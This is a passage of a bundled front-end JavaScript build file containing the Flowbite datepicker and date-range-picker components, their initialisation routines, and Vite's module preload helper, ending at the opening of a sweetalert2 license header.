    value: function setNextBtnDisabled(disabled) {
      this.controls.nextBtn.disabled = disabled;
    }
  }, {
    key: "changeView",
    value: function changeView(viewId) {
      var oldView = this.currentView;
      var newView = this.views[viewId];
      if (newView.id !== oldView.id) {
        this.currentView = newView;
        this._renderMethod = "render";
        triggerDatepickerEvent(this.datepicker, "changeView");
        this.main.replaceChild(newView.element, oldView.element);
      }
      return this;
    }
    // Change the focused date (view date)
  }, {
    key: "changeFocus",
    value: function changeFocus(newViewDate) {
      this._renderMethod = setViewDate(this, newViewDate) ? "render" : "refreshFocus";
      this.views.forEach(function(view) {
        view.updateFocus();
      });
      return this;
    }
    // Apply the change of the selected dates
  }, {
    key: "update",
    value: function update2() {
      var newViewDate = computeResetViewDate(this.datepicker);
      this._renderMethod = setViewDate(this, newViewDate) ? "render" : "refresh";
      this.views.forEach(function(view) {
        view.updateFocus();
        view.updateSelection();
      });
      return this;
    }
    // Refresh the picker UI
  }, {
    key: "render",
    value: function render2() {
      var quickRender = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : true;
      var renderMethod = quickRender && this._renderMethod || "render";
      delete this._renderMethod;
      this.currentView[renderMethod]();
    }
  }]);
}();
function findNextAvailableOne(date2, addFn, increase, testFn, min2, max2) {
  if (!isInRange(date2, min2, max2)) {
    return;
  }
  if (testFn(date2)) {
    var newDate = addFn(date2, increase);
    return findNextAvailableOne(newDate, addFn, increase, testFn, min2, max2);
  }
  return date2;
}
function moveByArrowKey(datepicker, ev, direction, vertical) {
  var picker = datepicker.picker;
  var currentView = picker.currentView;
  var step = currentView.step || 1;
  var viewDate = picker.viewDate;
  var addFn;
  var testFn;
  switch (currentView.id) {
    case 0:
      if (vertical) {
        viewDate = addDays(viewDate, direction * 7);
      } else if (ev.ctrlKey || ev.metaKey) {
        viewDate = addYears(viewDate, direction);
      } else {
        viewDate = addDays(viewDate, direction);
      }
      addFn = addDays;
      testFn = function testFn2(date2) {
        return currentView.disabled.includes(date2);
      };
      break;
    case 1:
      viewDate = addMonths(viewDate, vertical ? direction * 4 : direction);
      addFn = addMonths;
      testFn = function testFn2(date2) {
        var dt = new Date(date2);
        var year = currentView.year, disabled = currentView.disabled;
        return dt.getFullYear() === year && disabled.includes(dt.getMonth());
      };
      break;
    default:
      viewDate = addYears(viewDate, direction * (vertical ? 4 : 1) * step);
      addFn = addYears;
      testFn = function testFn2(date2) {
        return currentView.disabled.includes(startOfYearPeriod(date2, step));
      };
  }
  viewDate = findNextAvailableOne(viewDate, addFn, direction < 0 ? -step : step, testFn, currentView.minDate, currentView.maxDate);
  if (viewDate !== void 0) {
    picker.changeFocus(viewDate).render();
  }
}
function onKeydown(datepicker, ev) {
  if (ev.key === "Tab") {
    unfocus(datepicker);
    return;
  }
  var picker = datepicker.picker;
  var _picker$currentView = picker.currentView, id = _picker$currentView.id, isMinView = _picker$currentView.isMinView;
  if (!picker.active) {
    switch (ev.key) {
      case "ArrowDown":
      case "Escape":
        picker.show();
        break;
      case "Enter":
        datepicker.update();
        break;
      default:
        return;
    }
  } else if (datepicker.editMode) {
    switch (ev.key) {
      case "Escape":
        picker.hide();
        break;
      case "Enter":
        datepicker.exitEditMode({
          update: true,
          autohide: datepicker.config.autohide
        });
        break;
      default:
        return;
    }
  } else {
    switch (ev.key) {
      case "Escape":
        picker.hide();
        break;
      case "ArrowLeft":
        if (ev.ctrlKey || ev.metaKey) {
          goToPrevOrNext(datepicker, -1);
        } else if (ev.shiftKey) {
          datepicker.enterEditMode();
          return;
        } else {
          moveByArrowKey(datepicker, ev, -1, false);
        }
        break;
      case "ArrowRight":
        if (ev.ctrlKey || ev.metaKey) {
          goToPrevOrNext(datepicker, 1);
        } else if (ev.shiftKey) {
          datepicker.enterEditMode();
          return;
        } else {
          moveByArrowKey(datepicker, ev, 1, false);
        }
        break;
      case "ArrowUp":
        if (ev.ctrlKey || ev.metaKey) {
          switchView(datepicker);
        } else if (ev.shiftKey) {
          datepicker.enterEditMode();
          return;
        } else {
          moveByArrowKey(datepicker, ev, -1, true);
        }
        break;
      case "ArrowDown":
        if (ev.shiftKey && !ev.ctrlKey && !ev.metaKey) {
          datepicker.enterEditMode();
          return;
        }
        moveByArrowKey(datepicker, ev, 1, true);
        break;
      case "Enter":
        if (isMinView) {
          datepicker.setDate(picker.viewDate);
        } else {
          picker.changeView(id - 1).render();
        }
        break;
      case "Backspace":
      case "Delete":
        datepicker.enterEditMode();
        return;
      default:
        if (ev.key.length === 1 && !ev.ctrlKey && !ev.metaKey) {
          datepicker.enterEditMode();
        }
        return;
    }
  }
  ev.preventDefault();
  ev.stopPropagation();
}
function onFocus(datepicker) {
  if (datepicker.config.showOnFocus && !datepicker._showing) {
    datepicker.show();
  }
}
function onMousedown(datepicker, ev) {
  var el = ev.target;
  if (datepicker.picker.active || datepicker.config.showOnClick) {
    el._active = el === document.activeElement;
    el._clicking = setTimeout(function() {
      delete el._active;
      delete el._clicking;
    }, 2e3);
  }
}
function onClickInput(datepicker, ev) {
  var el = ev.target;
  if (!el._clicking) {
    return;
  }
  clearTimeout(el._clicking);
  delete el._clicking;
  if (el._active) {
    datepicker.enterEditMode();
  }
  delete el._active;
  if (datepicker.config.showOnClick) {
    datepicker.show();
  }
}
function onPaste(datepicker, ev) {
  if (ev.clipboardData.types.includes("text/plain")) {
    datepicker.enterEditMode();
  }
}
function onClickOutside(datepicker, ev) {
  var element = datepicker.element;
  if (element !== document.activeElement) {
    return;
  }
  var pickerElem = datepicker.picker.element;
  if (findElementInEventPath(ev, function(el) {
    return el === element || el === pickerElem;
  })) {
    return;
  }
  unfocus(datepicker);
}
function stringifyDates(dates, config) {
  return dates.map(function(dt) {
    return formatDate(dt, config.format, config.locale);
  }).join(config.dateDelimiter);
}
function processInputDates(datepicker, inputDates) {
  var clear = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : false;
  var config = datepicker.config, origDates = datepicker.dates, rangepicker = datepicker.rangepicker;
  if (inputDates.length === 0) {
    return clear ? [] : void 0;
  }
  var rangeEnd = rangepicker && datepicker === rangepicker.datepickers[1];
  var newDates = inputDates.reduce(function(dates, dt) {
    var date2 = parseDate(dt, config.format, config.locale);
    if (date2 === void 0) {
      return dates;
    }
    if (config.pickLevel > 0) {
      var _dt = new Date(date2);
      if (config.pickLevel === 1) {
        date2 = rangeEnd ? _dt.setMonth(_dt.getMonth() + 1, 0) : _dt.setDate(1);
      } else {
        date2 = rangeEnd ? _dt.setFullYear(_dt.getFullYear() + 1, 0, 0) : _dt.setMonth(0, 1);
      }
    }
    if (isInRange(date2, config.minDate, config.maxDate) && !dates.includes(date2) && !config.datesDisabled.includes(date2) && !config.daysOfWeekDisabled.includes(new Date(date2).getDay())) {
      dates.push(date2);
    }
    return dates;
  }, []);
  if (newDates.length === 0) {
    return;
  }
  if (config.multidate && !clear) {
    newDates = newDates.reduce(function(dates, date2) {
      if (!origDates.includes(date2)) {
        dates.push(date2);
      }
      return dates;
    }, origDates.filter(function(date2) {
      return !newDates.includes(date2);
    }));
  }
  return config.maxNumberOfDates && newDates.length > config.maxNumberOfDates ? newDates.slice(config.maxNumberOfDates * -1) : newDates;
}
function refreshUI(datepicker) {
  var mode = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 3;
  var quickRender = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : true;
  var config = datepicker.config, picker = datepicker.picker, inputField = datepicker.inputField;
  if (mode & 2) {
    var newView = picker.active ? config.pickLevel : config.startView;
    picker.update().changeView(newView).render(quickRender);
  }
  if (mode & 1 && inputField) {
    inputField.value = stringifyDates(datepicker.dates, config);
  }
}
function _setDate(datepicker, inputDates, options) {
  var clear = options.clear, render2 = options.render, autohide = options.autohide;
  if (render2 === void 0) {
    render2 = true;
  }
  if (!render2) {
    autohide = false;
  } else if (autohide === void 0) {
    autohide = datepicker.config.autohide;
  }
  var newDates = processInputDates(datepicker, inputDates, clear);
  if (!newDates) {
    return;
  }
  if (newDates.toString() !== datepicker.dates.toString()) {
    datepicker.dates = newDates;
    refreshUI(datepicker, render2 ? 3 : 1);
    triggerDatepickerEvent(datepicker, "changeDate");
  } else {
    refreshUI(datepicker, 1);
  }
  if (autohide) {
    datepicker.hide();
  }
}
var Datepicker$1 = /* @__PURE__ */ function() {
  function Datepicker2(element) {
    var options = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    var rangepicker = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : void 0;
    _classCallCheck$1(this, Datepicker2);
    element.datepicker = this;
    this.element = element;
    var config = this.config = Object.assign({
      buttonClass: options.buttonClass && String(options.buttonClass) || "button",
      container: document.body,
      defaultViewDate: today(),
      maxDate: void 0,
      minDate: void 0
    }, processOptions(defaultOptions$1, this));
    this._options = options;
    Object.assign(config, processOptions(options, this));
    var inline = this.inline = element.tagName !== "INPUT";
    var inputField;
    var initialDates;
    if (inline) {
      config.container = element;
      initialDates = stringToArray(element.dataset.date, config.dateDelimiter);
      delete element.dataset.date;
    } else {
      var container = options.container ? document.querySelector(options.container) : null;
      if (container) {
        config.container = container;
      }
      inputField = this.inputField = element;
      inputField.classList.add("datepicker-input");
      initialDates = stringToArray(inputField.value, config.dateDelimiter);
    }
    if (rangepicker) {
      var index = rangepicker.inputs.indexOf(inputField);
      var datepickers = rangepicker.datepickers;
      if (index < 0 || index > 1 || !Array.isArray(datepickers)) {
        throw Error("Invalid rangepicker object.");
      }
      datepickers[index] = this;
      Object.defineProperty(this, "rangepicker", {
        get: function get() {
          return rangepicker;
        }
      });
    }
    this.dates = [];
    var inputDateValues = processInputDates(this, initialDates);
    if (inputDateValues && inputDateValues.length > 0) {
      this.dates = inputDateValues;
    }
    if (inputField) {
      inputField.value = stringifyDates(this.dates, config);
    }
    var picker = this.picker = new Picker(this);
    if (inline) {
      this.show();
    } else {
      var onMousedownDocument = onClickOutside.bind(null, this);
      var listeners = [[inputField, "keydown", onKeydown.bind(null, this)], [inputField, "focus", onFocus.bind(null, this)], [inputField, "mousedown", onMousedown.bind(null, this)], [inputField, "click", onClickInput.bind(null, this)], [inputField, "paste", onPaste.bind(null, this)], [document, "mousedown", onMousedownDocument], [document, "touchstart", onMousedownDocument], [window, "resize", picker.place.bind(picker)]];
      registerListeners(this, listeners);
    }
  }
  return _createClass$1(Datepicker2, [{
    key: "active",
    get: (
      /**
       * @type {Boolean} - Whether the picker element is shown. `true` whne shown
       */
      function get() {
        return !!(this.picker && this.picker.active);
      }
    )
    /**
     * @type {HTMLDivElement} - DOM object of picker element
     */
  }, {
    key: "pickerElement",
    get: function get() {
      return this.picker ? this.picker.element : void 0;
    }
    /**
     * Set new values to the config options
     * @param {Object} options - config options to update
     */
  }, {
    key: "setOptions",
    value: function setOptions(options) {
      var picker = this.picker;
      var newOptions = processOptions(options, this);
      Object.assign(this._options, options);
      Object.assign(this.config, newOptions);
      picker.setOptions(newOptions);
      refreshUI(this, 3);
    }
    /**
     * Show the picker element
     */
  }, {
    key: "show",
    value: function show2() {
      if (this.inputField) {
        if (this.inputField.disabled) {
          return;
        }
        if (this.inputField !== document.activeElement) {
          this._showing = true;
          this.inputField.focus();
          delete this._showing;
        }
      }
      this.picker.show();
    }
    /**
     * Hide the picker element
     * Not available on inline picker
     */
  }, {
    key: "hide",
    value: function hide2() {
      if (this.inline) {
        return;
      }
      this.picker.hide();
      this.picker.update().changeView(this.config.startView).render();
    }
    /**
     * Destroy the Datepicker instance
     * @return {Detepicker} - the instance destroyed
     */
  }, {
    key: "destroy",
    value: function destroy() {
      this.hide();
      unregisterListeners(this);
      this.picker.detach();
      if (!this.inline) {
        this.inputField.classList.remove("datepicker-input");
      }
      delete this.element.datepicker;
      return this;
    }
    /**
     * Get the selected date(s)
     *
     * The method returns a Date object of selected date by default, and returns
     * an array of selected dates in multidate mode. If format string is passed,
     * it returns date string(s) formatted in given format.
     *
     * @param  {String} [format] - Format string to stringify the date(s)
     * @return {Date|String|Date[]|String[]} - selected date(s), or if none is
     * selected, empty array in multidate mode and untitled in sigledate mode
     */
  }, {
    key: "getDate",
    value: function getDate() {
      var _this = this;
      var format = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : void 0;
      var callback = format ? function(date2) {
        return formatDate(date2, format, _this.config.locale);
      } : function(date2) {
        return new Date(date2);
      };
      if (this.config.multidate) {
        return this.dates.map(callback);
      }
      if (this.dates.length > 0) {
        return callback(this.dates[0]);
      }
    }
    /**
     * Set selected date(s)
     *
     * In multidate mode, you can pass multiple dates as a series of arguments
     * or an array. (Since each date is parsed individually, the type of the
     * dates doesn't have to be the same.)
     * The given dates are used to toggle the select status of each date. The
     * number of selected dates is kept from exceeding the length set to
     * maxNumberOfDates.
     *
     * With clear: true option, the method can be used to clear the selection
     * and to replace the selection instead of toggling in multidate mode.
     * If the option is passed with no date arguments or an empty dates array,
     * it works as "clear" (clear the selection then set nothing), and if the
     * option is passed with new dates to select, it works as "replace" (clear
     * the selection then set the given dates)
     *
     * When render: false option is used, the method omits re-rendering the
     * picker element. In this case, you need to call refresh() method later in
     * order for the picker element to reflect the changes. The input field is
     * refreshed always regardless of this option.
     *
     * When invalid (unparsable, repeated, disabled or out-of-range) dates are
     * passed, the method ignores them and applies only valid ones. In the case
     * that all the given dates are invalid, which is distinguished from passing
     * no dates, the method considers it as an error and leaves the selection
     * untouched.
     *
     * @param {...(Date|Number|String)|Array} [dates] - Date strings, Date
     * objects, time values or mix of those for new selection
     * @param {Object} [options] - function options
     * - clear: {boolean} - Whether to clear the existing selection
     *     defualt: false
     * - render: {boolean} - Whether to re-render the picker element
     *     default: true
     * - autohide: {boolean} - Whether to hide the picker element after re-render
     *     Ignored when used with render: false
     *     default: config.autohide
     */
  }, {
    key: "setDate",
    value: function setDate() {
      for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }
      var dates = [].concat(args);
      var opts = {};
      var lastArg = lastItemOf(args);
      if (_typeof$1(lastArg) === "object" && !Array.isArray(lastArg) && !(lastArg instanceof Date) && lastArg) {
        Object.assign(opts, dates.pop());
      }
      var inputDates = Array.isArray(dates[0]) ? dates[0] : dates;
      _setDate(this, inputDates, opts);
    }
    /**
     * Update the selected date(s) with input field's value
     * Not available on inline picker
     *
     * The input field will be refreshed with properly formatted date string.
     *
     * @param  {Object} [options] - function options
     * - autohide: {boolean} - whether to hide the picker element after refresh
     *     default: false
     */
  }, {
    key: "update",
    value: function update2() {
      var options = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : void 0;
      if (this.inline) {
        return;
      }
      var opts = {
        clear: true,
        autohide: !!(options && options.autohide)
      };
      var inputDates = stringToArray(this.inputField.value, this.config.dateDelimiter);
      _setDate(this, inputDates, opts);
    }
    /**
     * Refresh the picker element and the associated input field
     * @param {String} [target] - target item when refreshing one item only
     * 'picker' or 'input'
     * @param {Boolean} [forceRender] - whether to re-render the picker element
     * regardless of its state instead of optimized refresh
     */
  }, {
    key: "refresh",
    value: function refresh() {
      var target = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : void 0;
      var forceRender = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
      if (target && typeof target !== "string") {
        forceRender = target;
        target = void 0;
      }
      var mode;
      if (target === "picker") {
        mode = 2;
      } else if (target === "input") {
        mode = 1;
      } else {
        mode = 3;
      }
      refreshUI(this, mode, !forceRender);
    }
    /**
     * Enter edit mode
     * Not available on inline picker or when the picker element is hidden
     */
  }, {
    key: "enterEditMode",
    value: function enterEditMode() {
      if (this.inline || !this.picker.active || this.editMode) {
        return;
      }
      this.editMode = true;
      this.inputField.classList.add("in-edit", "border-blue-700", "!border-primary-700");
    }
    /**
     * Exit from edit mode
     * Not available on inline picker
     * @param  {Object} [options] - function options
     * - update: {boolean} - whether to call update() after exiting
     *     If false, input field is revert to the existing selection
     *     default: false
     */
  }, {
    key: "exitEditMode",
    value: function exitEditMode() {
      var options = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : void 0;
      if (this.inline || !this.editMode) {
        return;
      }
      var opts = Object.assign({
        update: false
      }, options);
      delete this.editMode;
      this.inputField.classList.remove("in-edit", "border-blue-700", "!border-primary-700");
      if (opts.update) {
        this.update(opts);
      }
    }
  }], [{
    key: "formatDate",
    value: function formatDate$1(date2, format, lang) {
      return formatDate(date2, format, lang && locales[lang] || locales.en);
    }
    /**
     * Parse date string
     * @param  {String|Date|Number} dateStr - date string, Date object or time
     * value to parse
     * @param  {String|Object} format - format string or object that contains
     * toValue() custom parser, whose signature is
     * - args:
     *   - dateStr: {String|Date|Number} - the dateStr passed to the method
     *   - format: {Object} - the format object passed to the method
     *   - locale: {Object} - locale for the language specified by `lang`
     * - return:
     *     {Date|Number} parsed date or its time value
     * @param  {String} [lang=en] - language code for the locale to use
     * @return {Number} time value of parsed date
     */
  }, {
    key: "parseDate",
    value: function parseDate$1(dateStr, format, lang) {
      return parseDate(dateStr, format, lang && locales[lang] || locales.en);
    }
    /**
     * @type {Object} - Installed locales in `[languageCode]: localeObject` format
     * en`:_English (US)_ is pre-installed.
     */
  }, {
    key: "locales",
    get: function get() {
      return locales;
    }
  }]);
}();
function filterOptions(options) {
  var newOpts = Object.assign({}, options);
  delete newOpts.inputs;
  delete newOpts.allowOneSidedRange;
  delete newOpts.maxNumberOfDates;
  return newOpts;
}
function setupDatepicker(rangepicker, changeDateListener, el, options) {
  registerListeners(rangepicker, [[el, "changeDate", changeDateListener]]);
  new Datepicker$1(el, options, rangepicker);
}
function onChangeDate(rangepicker, ev) {
  if (rangepicker._updating) {
    return;
  }
  rangepicker._updating = true;
  var target = ev.target;
  if (target.datepicker === void 0) {
    return;
  }
  var datepickers = rangepicker.datepickers;
  var setDateOptions = {
    render: false
  };
  var changedSide = rangepicker.inputs.indexOf(target);
  var otherSide = changedSide === 0 ? 1 : 0;
  var changedDate = datepickers[changedSide].dates[0];
  var otherDate = datepickers[otherSide].dates[0];
  if (changedDate !== void 0 && otherDate !== void 0) {
    if (changedSide === 0 && changedDate > otherDate) {
      datepickers[0].setDate(otherDate, setDateOptions);
      datepickers[1].setDate(changedDate, setDateOptions);
    } else if (changedSide === 1 && changedDate < otherDate) {
      datepickers[0].setDate(changedDate, setDateOptions);
      datepickers[1].setDate(otherDate, setDateOptions);
    }
  } else if (!rangepicker.allowOneSidedRange) {
    if (changedDate !== void 0 || otherDate !== void 0) {
      setDateOptions.clear = true;
      datepickers[otherSide].setDate(datepickers[changedSide].dates, setDateOptions);
    }
  }
  datepickers[0].picker.update().render();
  datepickers[1].picker.update().render();
  delete rangepicker._updating;
}
var DateRangePicker = /* @__PURE__ */ function() {
  function DateRangePicker2(element) {
    var options = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    _classCallCheck$1(this, DateRangePicker2);
    var inputs = Array.isArray(options.inputs) ? options.inputs : Array.from(element.querySelectorAll("input"));
    if (inputs.length < 2) {
      return;
    }
    element.rangepicker = this;
    this.element = element;
    this.inputs = inputs.slice(0, 2);
    this.allowOneSidedRange = !!options.allowOneSidedRange;
    var changeDateListener = onChangeDate.bind(null, this);
    var cleanOptions = filterOptions(options);
    var datepickers = [];
    Object.defineProperty(this, "datepickers", {
      get: function get() {
        return datepickers;
      }
    });
    setupDatepicker(this, changeDateListener, this.inputs[0], cleanOptions);
    setupDatepicker(this, changeDateListener, this.inputs[1], cleanOptions);
    Object.freeze(datepickers);
    if (datepickers[0].dates.length > 0) {
      onChangeDate(this, {
        target: this.inputs[0]
      });
    } else if (datepickers[1].dates.length > 0) {
      onChangeDate(this, {
        target: this.inputs[1]
      });
    }
  }
  return _createClass$1(DateRangePicker2, [{
    key: "dates",
    get: function get() {
      return this.datepickers.length === 2 ? [this.datepickers[0].dates[0], this.datepickers[1].dates[0]] : void 0;
    }
    /**
     * Set new values to the config options
     * @param {Object} options - config options to update
     */
  }, {
    key: "setOptions",
    value: function setOptions(options) {
      this.allowOneSidedRange = !!options.allowOneSidedRange;
      var cleanOptions = filterOptions(options);
      this.datepickers[0].setOptions(cleanOptions);
      this.datepickers[1].setOptions(cleanOptions);
    }
    /**
     * Destroy the DateRangePicker instance
     * @return {DateRangePicker} - the instance destroyed
     */
  }, {
    key: "destroy",
    value: function destroy() {
      this.datepickers[0].destroy();
      this.datepickers[1].destroy();
      unregisterListeners(this);
      delete this.element.rangepicker;
    }
    /**
     * Get the start and end dates of the date range
     *
     * The method returns Date objects by default. If format string is passed,
     * it returns date strings formatted in given format.
     * The result array always contains 2 items (start date/end date) and
     * undefined is used for unselected side. (e.g. If none is selected,
     * the result will be [undefined, undefined]. If only the end date is set
     * when allowOneSidedRange config option is true, [undefined, endDate] will
     * be returned.)
     *
     * @param  {String} [format] - Format string to stringify the dates
     * @return {Array} - Start and end dates
     */
  }, {
    key: "getDates",
    value: function getDates() {
      var _this = this;
      var format = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : void 0;
      var callback = format ? function(date2) {
        return formatDate(date2, format, _this.datepickers[0].config.locale);
      } : function(date2) {
        return new Date(date2);
      };
      return this.dates.map(function(date2) {
        return date2 === void 0 ? date2 : callback(date2);
      });
    }
    /**
     * Set the start and end dates of the date range
     *
     * The method calls datepicker.setDate() internally using each of the
     * arguments in startend order.
     *
     * When a clear: true option object is passed instead of a date, the method
     * clears the date.
     *
     * If an invalid date, the same date as the current one or an option object
     * without clear: true is passed, the method considers that argument as an
     * "ineffective" argument because calling datepicker.setDate() with those
     * values makes no changes to the date selection.
     *
     * When the allowOneSidedRange config option is false, passing {clear: true}
     * to clear the range works only when it is done to the last effective
     * argument (in other words, passed to rangeEnd or to rangeStart along with
     * ineffective rangeEnd). This is because when the date range is changed,
     * it gets normalized based on the last change at the end of the changing
     * process.
     *
     * @param {Date|Number|String|Object} rangeStart - Start date of the range
     * or {clear: true} to clear the date
     * @param {Date|Number|String|Object} rangeEnd - End date of the range
     * or {clear: true} to clear the date
     */
  }, {
    key: "setDates",
    value: function setDates(rangeStart, rangeEnd) {
      var _this$datepickers = _slicedToArray(this.datepickers, 2), datepicker0 = _this$datepickers[0], datepicker1 = _this$datepickers[1];
      var origDates = this.dates;
      this._updating = true;
      datepicker0.setDate(rangeStart);
      datepicker1.setDate(rangeEnd);
      delete this._updating;
      if (datepicker1.dates[0] !== origDates[1]) {
        onChangeDate(this, {
          target: this.inputs[1]
        });
      } else if (datepicker0.dates[0] !== origDates[0]) {
        onChangeDate(this, {
          target: this.inputs[0]
        });
      }
    }
  }]);
}();
var __assign = function() {
  __assign = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign.apply(this, arguments);
};
var Default = {
  defaultDatepickerId: null,
  autohide: false,
  format: "mm/dd/yyyy",
  maxDate: null,
  minDate: null,
  orientation: "bottom",
  buttons: false,
  autoSelectToday: 0,
  title: null,
  language: "en",
  rangePicker: false,
  onShow: function() {
  },
  onHide: function() {
  }
};
var DefaultInstanceOptions = {
  id: null,
  override: true
};
var Datepicker = (
  /** @class */
  function() {
    function Datepicker2(datepickerEl, options, instanceOptions) {
      if (datepickerEl === void 0) {
        datepickerEl = null;
      }
      if (options === void 0) {
        options = Default;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : datepickerEl.id;
      this._datepickerEl = datepickerEl;
      this._datepickerInstance = null;
      this._options = __assign(__assign({}, Default), options);
      this._initialized = false;
      this.init();
      instances.addInstance("Datepicker", this, this._instanceId, instanceOptions.override);
    }
    Datepicker2.prototype.init = function() {
      if (this._datepickerEl && !this._initialized) {
        if (this._options.rangePicker) {
          this._datepickerInstance = new DateRangePicker(this._datepickerEl, this._getDatepickerOptions(this._options));
        } else {
          this._datepickerInstance = new Datepicker$1(this._datepickerEl, this._getDatepickerOptions(this._options));
        }
        this._initialized = true;
      }
    };
    Datepicker2.prototype.destroy = function() {
      if (this._initialized) {
        this._initialized = false;
        this._datepickerInstance.destroy();
      }
    };
    Datepicker2.prototype.removeInstance = function() {
      this.destroy();
      instances.removeInstance("Datepicker", this._instanceId);
    };
    Datepicker2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Datepicker2.prototype.getDatepickerInstance = function() {
      return this._datepickerInstance;
    };
    Datepicker2.prototype.getDate = function() {
      if (this._options.rangePicker && this._datepickerInstance instanceof DateRangePicker) {
        return this._datepickerInstance.getDates();
      }
      if (!this._options.rangePicker && this._datepickerInstance instanceof Datepicker$1) {
        return this._datepickerInstance.getDate();
      }
    };
    Datepicker2.prototype.setDate = function(date2) {
      if (this._options.rangePicker && this._datepickerInstance instanceof DateRangePicker) {
        return this._datepickerInstance.setDates(date2);
      }
      if (!this._options.rangePicker && this._datepickerInstance instanceof Datepicker$1) {
        return this._datepickerInstance.setDate(date2);
      }
    };
    Datepicker2.prototype.show = function() {
      this._datepickerInstance.show();
      this._options.onShow(this);
    };
    Datepicker2.prototype.hide = function() {
      this._datepickerInstance.hide();
      this._options.onHide(this);
    };
    Datepicker2.prototype._getDatepickerOptions = function(options) {
      var datepickerOptions = {};
      if (options.buttons) {
        datepickerOptions.todayBtn = true;
        datepickerOptions.clearBtn = true;
        if (options.autoSelectToday) {
          datepickerOptions.todayBtnMode = 1;
        }
      }
      if (options.autohide) {
        datepickerOptions.autohide = true;
      }
      if (options.format) {
        datepickerOptions.format = options.format;
      }
      if (options.maxDate) {
        datepickerOptions.maxDate = options.maxDate;
      }
      if (options.minDate) {
        datepickerOptions.minDate = options.minDate;
      }
      if (options.orientation) {
        datepickerOptions.orientation = options.orientation;
      }
      if (options.title) {
        datepickerOptions.title = options.title;
      }
      if (options.language) {
        datepickerOptions.language = options.language;
      }
      return datepickerOptions;
    };
    Datepicker2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Datepicker2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    return Datepicker2;
  }()
);
function initDatepickers() {
  document.querySelectorAll("[datepicker], [inline-datepicker], [date-rangepicker]").forEach(function($datepickerEl) {
    if ($datepickerEl) {
      var buttons = $datepickerEl.hasAttribute("datepicker-buttons");
      var autoselectToday = $datepickerEl.hasAttribute("datepicker-autoselect-today");
      var autohide = $datepickerEl.hasAttribute("datepicker-autohide");
      var format = $datepickerEl.getAttribute("datepicker-format");
      var maxDate = $datepickerEl.getAttribute("datepicker-max-date");
      var minDate = $datepickerEl.getAttribute("datepicker-min-date");
      var orientation_1 = $datepickerEl.getAttribute("datepicker-orientation");
      var title = $datepickerEl.getAttribute("datepicker-title");
      var language = $datepickerEl.getAttribute("datepicker-language");
      var rangePicker = $datepickerEl.hasAttribute("date-rangepicker");
      new Datepicker($datepickerEl, {
        buttons: buttons ? buttons : Default.buttons,
        autoSelectToday: autoselectToday ? autoselectToday : Default.autoSelectToday,
        autohide: autohide ? autohide : Default.autohide,
        format: format ? format : Default.format,
        maxDate: maxDate ? maxDate : Default.maxDate,
        minDate: minDate ? minDate : Default.minDate,
        orientation: orientation_1 ? orientation_1 : Default.orientation,
        title: title ? title : Default.title,
        language: language ? language : Default.language,
        rangePicker: rangePicker ? rangePicker : Default.rangePicker
      });
    } else {
      console.error("The datepicker element does not exist. Please check the datepicker attribute.");
    }
  });
}
if (typeof window !== "undefined") {
  window.Datepicker = Datepicker;
  window.initDatepickers = initDatepickers;
}
function initFlowbite() {
  initAccordions();
  initCollapses();
  initCarousels();
  initDismisses();
  initDropdowns();
  initModals();
  initDrawers();
  initTabs();
  initTooltips();
  initPopovers();
  initDials();
  initInputCounters();
  initCopyClipboards();
  initDatepickers();
}
if (typeof window !== "undefined") {
  window.initFlowbite = initFlowbite;
}
var events = new Events("load", [
  initAccordions,
  initCollapses,
  initCarousels,
  initDismisses,
  initDropdowns,
  initModals,
  initDrawers,
  initTabs,
  initTooltips,
  initPopovers,
  initDials,
  initInputCounters,
  initCopyClipboards,
  initDatepickers
]);
events.init();
const scriptRel = "modulepreload";
const assetsURL = function(dep) {
  return "/build/" + dep;
};
const seen = {};
const __vitePreload = function preload(baseModule, deps, importerUrl) {
  let promise = Promise.resolve();
  if (deps && deps.length > 0) {
    document.getElementsByTagName("link");
    const cspNonceMeta = document.querySelector(
      "meta[property=csp-nonce]"
    );
    const cspNonce = cspNonceMeta?.nonce || cspNonceMeta?.getAttribute("nonce");
    promise = Promise.allSettled(
      deps.map((dep) => {
        dep = assetsURL(dep);
        if (dep in seen) return;
        seen[dep] = true;
        const isCss = dep.endsWith(".css");
        const cssSelector = isCss ? '[rel="stylesheet"]' : "";
        if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
          return;
        }
        const link2 = document.createElement("link");
        link2.rel = isCss ? "stylesheet" : scriptRel;
        if (!isCss) {
          link2.as = "script";
        }
        link2.crossOrigin = "";
        link2.href = dep;
        if (cspNonce) {
          link2.setAttribute("nonce", cspNonce);
        }
        document.head.appendChild(link2);
        if (isCss) {
          return new Promise((res, rej) => {
            link2.addEventListener("load", res);
            link2.addEventListener(
              "error",
              () => rej(new Error(`Unable to preload CSS for ${dep}`))
            );
          });
        }
      })
    );
  }
  function handlePreloadError(err) {
    const e2 = new Event("vite:preloadError", {
      cancelable: true
    });
    e2.payload = err;
    window.dispatchEvent(e2);
    if (!e2.defaultPrevented) {
      throw err;
    }
  }
  return promise.then((res) => {
    for (const item of res || []) {
      if (item.status !== "rejected") continue;
      handlePreloadError(item.reason);
    }
    return baseModule().catch(handlePreloadError);
  });
};
/*!
* sweetalert2 v11.14.4
